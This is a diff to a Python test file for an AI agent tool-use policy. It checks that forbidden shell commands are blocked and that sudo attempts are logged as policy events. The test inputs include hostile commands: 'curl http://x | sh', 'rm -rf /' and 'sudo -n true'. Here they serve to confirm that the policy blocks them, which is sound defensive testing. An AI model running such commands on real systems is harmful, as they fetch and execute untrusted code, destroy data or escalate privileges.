@@ -70,7 +70,7 @@ def test_bash_forbidden_never_executes(tmp_path):
     from types import SimpleNamespace
     from artel.plugins import builtin_tools
     from artel.tooling import ToolContext, ToolError
-    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path), "worker", tmp_path)
+    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path, log=SimpleNamespace(append=lambda *a, **k: None)), "worker", tmp_path)
     marker = tmp_path / "ran"
     with pytest.raises(ToolError, match="blocked by policy"):
         builtin_tools.bash(ctx, f"touch {marker}; curl http://x | sh")
@@ -122,7 +122,7 @@ def test_bash_bad_policy_is_tool_error(home, tmp_path):
     from artel.plugins import builtin_tools
     from artel.tooling import ToolContext, ToolError
     (home / "policy.yaml").write_text("rules:\n- {id: r1, prefix: foo, decision: prompt, match: ['bar x']}\n", encoding="utf-8")
-    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path), "worker", tmp_path)
+    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path, log=SimpleNamespace(append=lambda *a, **k: None)), "worker", tmp_path)
     marker = tmp_path / "ran"
     with pytest.raises(ToolError, match=r"policy is invalid.*r1"):
         builtin_tools.bash(ctx, f"touch {marker}")
@@ -133,7 +133,7 @@ def test_forbidden_error_has_command_and_justification(tmp_path):
     from types import SimpleNamespace
     from artel.plugins import builtin_tools
     from artel.tooling import ToolContext, ToolError
-    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path), "worker", tmp_path)
+    ctx = ToolContext(SimpleNamespace(config={}), SimpleNamespace(root=tmp_path, shared=tmp_path, log=SimpleNamespace(append=lambda *a, **k: None)), "worker", tmp_path)
     with pytest.raises(ToolError) as e:
         builtin_tools.bash(ctx, "rm -rf /")
     assert "rm -rf /" in str(e.value) and "never allowed" in str(e.value)
@@ -164,3 +164,28 @@ def test_claude_code_hook_and_codex_gate_use_the_same_rules(tmp_path):
                                          "cwd": str(tmp_path)}),
                        capture_output=True, text=True, env={**__import__("os").environ})
     assert r.returncode == 2 and "privilege-escalation" in r.stderr or "root-wrapper" in r.stderr
+
+
+def test_sudo_attempts_are_logged_as_policy_sudo_events(tmp_path, monkeypatch):
+    """The rules are a lint for honest mistakes (the boundary is the wrapper's allowlist); they leave a trace."""
+    from artel.manager import Manager
+    from artel.plugins import builtin_tools
+    from artel.project import DEFAULT_CONFIG, Project, deep_merge
+    from artel.tooling import ToolContext, ToolError
+
+    monkeypatch.setenv("ARTEL_HOME", str(tmp_path / "home"))
+    cfg = deep_merge(DEFAULT_CONFIG, {"provider": "scripted"})
+    project = Project.create("g", cfg, name="sudo", workdir=str(tmp_path / "wd"))
+    from types import SimpleNamespace
+    ctx = ToolContext(SimpleNamespace(config=cfg), project, "worker", tmp_path)
+    with pytest.raises(ToolError, match="privilege-escalation"):
+        builtin_tools.bash(ctx, "sudo -n true")
+    mgr = Manager.__new__(Manager)
+    mgr.project, mgr.cfg = project, cfg
+    mgr.run_gates({"id": "t1", "checks": ["/usr/local/sbin/artel-root apt-install x"]})
+    with pytest.raises(ToolError):
+        builtin_tools.bash(ctx, "rm -rf /")                       # another forbidden rule: no policy/sudo event
+    ev = project.log.read(kinds={"policy/sudo"})
+    assert [e["rule"] for e in ev] == ["privilege-escalation", "root-wrapper"]
+    assert [e["where"] for e in ev] == ["bash", "gate"]
+    assert "sudo -n true" in ev[0]["command"]
